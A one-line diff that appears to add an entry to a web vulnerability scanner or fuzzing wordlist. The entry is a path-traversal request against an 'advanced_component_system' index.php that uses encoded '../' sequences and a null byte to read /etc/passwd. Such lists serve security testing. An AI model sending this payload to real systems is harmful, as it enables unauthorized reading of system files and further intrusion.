@@ -1,0 +1,1 @@
+/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
